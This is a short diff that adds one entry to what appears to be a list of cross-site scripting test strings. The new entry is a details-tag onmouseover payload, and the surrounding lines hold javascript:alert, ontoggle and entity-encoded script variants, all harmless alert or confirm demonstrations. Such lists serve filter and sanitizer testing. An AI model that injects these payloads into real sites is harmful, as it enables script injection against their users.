@@ -29,3 +29,5 @@ javascript:alert('XSS')
 <details/open/ontoggle=confirm`Hello, World!`>
 
 &#60;script&#62;alert('Hello, World!')&#60;/script&#62;
+
+<details/open/onmouseover=confirm`Hello, World!`>
